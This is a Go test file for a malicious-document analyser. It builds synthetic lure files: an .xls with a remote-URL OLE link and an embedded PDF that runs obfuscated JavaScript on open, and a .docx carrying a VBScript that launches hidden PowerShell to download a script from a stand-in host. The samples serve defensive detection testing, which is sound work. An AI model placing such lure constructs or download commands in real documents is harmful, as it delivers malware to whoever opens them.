package maldoctrace

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/debugactiveprocess/MaldocTrace/internal/cfbtest"
	"github.com/debugactiveprocess/MaldocTrace/report"
)

func zipBytes(t *testing.T, files map[string][]byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, data := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		w.Write(data)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func lpAnsiT(s string) []byte {
	return append(append(binary.LittleEndian.AppendUint32(nil, uint32(len(s)+1)), s...), 0)
}

func compObjT(userType, progID string) []byte {
	b := append(make([]byte, 28), lpAnsiT(userType)...)
	b = binary.LittleEndian.AppendUint32(b, 0)
	return append(b, lpAnsiT(progID)...)
}

// oleLinkURL builds an \x01Ole stream of a linked object with a URL moniker.
func oleLinkURL(url string) []byte {
	var u []byte
	for _, c := range utf16.Encode([]rune(url)) {
		u = binary.LittleEndian.AppendUint16(u, c)
	}
	u = append(u, 0, 0)
	clsid := []byte{0xE0, 0xC9, 0xEA, 0x79, 0xF9, 0xBA, 0xCE, 0x11, 0x8C, 0x82, 0x00, 0xAA, 0x00, 0x4B, 0xA9, 0x0B}
	mk := append(append(clsid, binary.LittleEndian.AppendUint32(nil, uint32(len(u)))...), u...)
	b := binary.LittleEndian.AppendUint32(nil, 0x02000001)
	b = binary.LittleEndian.AppendUint32(b, 1)
	b = append(b, make([]byte, 16)...)
	b = binary.LittleEndian.AppendUint32(b, uint32(len(mk)))
	return append(b, mk...)
}

const activePDF = "%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /J#61vaScript /JS (app.alert(1)) >> endobj\n3 0 obj << /URI (http://example.invalid/pdf) >> endobj\n%%EOF\n"

// The shape of an encrypted .xls seen in the wild: no macros, one MBD
// storage linking a remote URL (fetched on open) and one embedding an OOXML
// workbook that itself embeds a PDF.
func TestXLSLinkedAndEmbeddedObjects(t *testing.T) {
	pdfObj := cfbtest.Build(
		cfbtest.Stream{Name: "\x01CompObj", Data: compObjT("Acrobat Document", "AcroExch.Document.DC")},
		cfbtest.Stream{Name: "CONTENTS", Data: []byte(activePDF)},
	)
	inner := zipBytes(t, map[string][]byte{
		"[Content_Types].xml":          []byte(`<Types/>`),
		"xl/workbook.xml":              []byte(`<workbook/>`),
		"xl/embeddings/oleObject1.bin": pdfObj,
	})
	xls := cfbtest.Build(
		cfbtest.Stream{Name: "Workbook", Data: []byte{0x09, 0x08, 0, 0}},
		cfbtest.Stream{Name: "MBD00000001/\x01CompObj", Data: compObjT("Microsoft Office Excel Worksheet", "")},
		cfbtest.Stream{Name: "MBD00000001/Package", Data: inner},
		cfbtest.Stream{Name: "MBD00000002/\x01Ole", Data: oleLinkURL("http://example.invalid/payload")},
	)
	r := AnalyzeFromBytes(context.Background(), xls, "sample.xls", Options{})
	if r.Verdict != "malicious" {
		t.Fatalf("verdict %s %v", r.Verdict, r.VerdictReasons)
	}
	var linked bool
	for _, f := range r.StaticFindings {
		if f.Kind == "external_ole" && f.Severity == "high" && f.Target == "http://example.invalid/payload" && f.Location == "MBD00000002" {
			linked = true
		}
	}
	if !linked {
		t.Fatalf("linked object not reported: %+v", r.StaticFindings)
	}
	if !hasIOCType(r, "url", "http://example.invalid/payload") {
		t.Fatalf("URL not an IOC: %+v", r.Indicators)
	}
	if len(r.Children) != 1 || r.Children[0].Report.Format != "ooxml" {
		t.Fatalf("embedded workbook not analysed: %+v", r.Children)
	}
	child := r.Children[0].Report
	var pdf bool
	for _, a := range child.Artifacts {
		if a.FileType == "PDF document" && strings.Contains(strings.Join(a.Facts, " "), "/JavaScript=1") {
			pdf = true
		}
	}
	if !pdf || !hasFindingSev(child, "pdf_active_content", "high") || !hasIOCType(child, "url", "http://example.invalid/pdf") {
		t.Fatalf("PDF not described: %+v %+v", child.Artifacts, child.StaticFindings)
	}
	if !strings.Contains(report.RenderText(r), "Files found inside") {
		t.Fatal("children missing from text output")
	}
}

// A .docx embedding an OLE Package with a script: the script is reported,
// its commands recovered, and the verdict is malicious.
func TestDocxEmbeddedPackageScript(t *testing.T) {
	script := "Set s = CreateObject(\"WScript.Shell\")\r\ns.Run \"powershell -nop -w hidden -c iwr http://example.invalid/a.ps1\"\r\n"
	body := []byte{2, 0}
	body = append(append(body, "update.vbs"...), 0)
	body = append(append(body, `C:\Users\u\update.vbs`...), 0)
	body = append(body, 0, 0, 3, 0)
	body = append(body, lpAnsiT(`C:\Users\u\AppData\Local\Temp\update.vbs`)...)
	body = binary.LittleEndian.AppendUint32(body, uint32(len(script)))
	body = append(body, script...)
	native := append(binary.LittleEndian.AppendUint32(nil, uint32(len(body))), body...)
	obj := cfbtest.Build(
		cfbtest.Stream{Name: "\x01CompObj", Data: compObjT("Package", "Package")},
		cfbtest.Stream{Name: "\x01Ole10Native", Data: native},
	)
	docx := zipBytes(t, map[string][]byte{
		"[Content_Types].xml":            []byte(`<Types/>`),
		"word/document.xml":              []byte(`<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Open the attachment</w:t></w:r></w:p></w:body></w:document>`),
		"word/embeddings/oleObject1.bin": obj,
	})
	r := AnalyzeFromBytes(context.Background(), docx, "lure.docx", Options{})
	if r.Verdict != "malicious" || !hasFindingSev(r, "embedded_script", "high") || len(r.Commands) == 0 {
		t.Fatalf("verdict %s, findings %+v, commands %+v", r.Verdict, r.StaticFindings, r.Commands)
	}
	if !strings.Contains(r.Commands[0].CommandLine, "powershell") || !hasIOCType(r, "url", "http://example.invalid/a.ps1") {
		t.Fatalf("commands %+v iocs %+v", r.Commands, r.Indicators)
	}
}

// Nesting is bounded.
func TestEmbeddedDepthLimit(t *testing.T) {
	doc := zipBytes(t, map[string][]byte{"[Content_Types].xml": []byte(`<Types/>`)})
	for i := 0; i < 6; i++ {
		doc = zipBytes(t, map[string][]byte{"[Content_Types].xml": []byte(`<Types/>`), "word/embeddings/inner.docx": doc})
	}
	opts := Options{}
	opts.fill()
	opts.Limits.MaxNestedDepth = 3
	r := AnalyzeFromBytes(context.Background(), doc, "deep.docx", opts)
	depth := 0
	for c := r; len(c.Children) > 0; c = c.Children[0].Report {
		depth++
	}
	if depth != 3 {
		t.Fatalf("depth %d", depth)
	}
}

func hasIOCType(r *report.Report, typ, value string) bool {
	for _, i := range r.Indicators {
		if i.Type == typ && i.Value == value {
			return true
		}
	}
	return false
}

func hasFindingSev(r *report.Report, kind, sev string) bool {
	for _, f := range r.StaticFindings {
		if f.Kind == kind && f.Severity == sev {
			return true
		}
	}
	return false
}
